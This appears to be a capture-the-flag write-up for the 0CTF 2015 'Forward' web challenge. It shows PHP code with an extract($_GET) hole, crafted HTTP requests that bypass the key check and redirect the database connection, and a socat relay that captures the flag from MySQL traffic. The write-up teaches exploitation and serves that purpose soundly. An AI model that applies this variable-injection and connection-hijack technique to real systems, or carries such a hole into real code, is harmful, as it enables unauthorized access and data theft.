+++
author = "pwntester"
date = 2015-03-30T17:13:30Z
description = ""
draft = false
slug = "0ctf-short-write-ups"
title = "0CTF 2015 - Forward (web 250)"

+++

We are given access to a page and its source code:
```lang-php line-numbers
<?php
    if (isset($_GET['view-source'])) {
        show_source(__FILE__);
        exit();
    }
    include("./inc.php"); // key & database config
    function err($str){ die("<script>alert(\"$str\");window.location.href='./';</script>"); }
    $nonce = mt_rand();
    extract($_GET); // this is my backdoor :)
    if (empty($_POST['key'])) {
        err("Parameter Missing!");
    }
    if ($_POST['key'] !== $key) {
        err("You Are Not Authorized!");
    }
    $conn = mysql_connect($host, $user, $pass);
    if (!$conn) {
        err("Database Error, Please Contact with GameMaster!");
    }
    $query = isset($_POST['query']) ? bin2hex($_POST['query']) : "SELECT flag FROM forward.flag";
    $res = mysql_query($query);
    if (FALSE == $res) {
        err("Database Error, Please Contact with GameMaster!");
    }
    $row = mysql_fetch_array($res);
    if ($debug) {
        echo "HOST:\t{$host}<br/>";
        echo "USER:\t{$user}<br/>";
    }
    echo "<del>FLAG:\t0ctf{</del>" . sha1($nonce . md5($row['flag'])) . "<del>}</del><br/>"; // not real flag
    mysql_close($conn);

?>
```
We can inject any variable because of the `extract($_GET);` as long as it is not later overwritten. Thats usefule to bypass the `key` check and to get the `host` name and `user` using the `debug` mode:

Request:
```lang-raw
POST /admin.php?key=NOKEY&debug=1 HTTP/1.1
Host: 202.112.28.121
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:36.0) Gecko/20100101 Firefox/36.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,es-ES;q=0.8,es;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://202.112.28.121/
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

key=NOKEY
```

Response:
```lang-raw
HTTP/1.1 200 OK
Date: Sun, 29 Mar 2015 22:57:20 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.7
Vary: Accept-Encoding
Content-Length: 123
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

HOST:	162.243.129.228<br/>USER:	forward<br/><del>FLAG:	0ctf{</del>cd8b8ddac686f4ead123786fead8f9476e975b17<del>}</del><br/>
```
We can check that the server is allowing mysql connections on default port (3306) so what we can do is set up a proxy in our machine to receive the DB connection and `forward` it to the real DB server. We use `socat` for that:

```lang-bash
root@www:~# socat -v TCP-LISTEN:3306 TCP:202.112.28.121:3306
```

Now, we can force the connection to go through our server and watch the traffic (query results == flag) going through the proxy:

```lang-raw
POST /admin.php?key=NOKEY&debug=1&nonce=&host=xxx.yyy.zzz.www HTTP/1.1
```

Intercepted traffic:
```lang-bash
root@www:~# socat -v TCP-LISTEN:3306 TCP:202.112.28.121:3306
< 2015/03/29 22:57:33.303951  length=95 from=0 to=94
[...
5.5.41-0ubuntu0.14.04.1.fo\v.\\2%bA]0t...\b...............z)Zi"hgL)''-.mysql_native_password.> 2015/03/29 22:57:33.527793  length=87 from=0 to=86
S..........@\b.......................forward......U..l.._....X....mysql_native_password.< 2015/03/29 22:57:33.739001  length=11 from=95 to=105
\a..........> 2015/03/29 22:57:33.963015  length=7 from=87 to=93
.......< 2015/03/29 22:57:34.174384  length=9 from=106 to=114
.........> 2015/03/29 22:57:34.398563  length=34 from=94 to=127
.....SELECT flag FROM forward.flag< 2015/03/29 22:57:34.610552  length=96 from=115 to=210
.....-....def\aforward.flag.flag.flag.flag\f\b.0................"......0ctf{w3ll_d0ne_guY}.......".> 2015/03/29 22:57:34.834863  length=5 from=128 to=132
.....root@www:~#
```

FLAG is `0ctf{w3ll_d0ne_guY}`

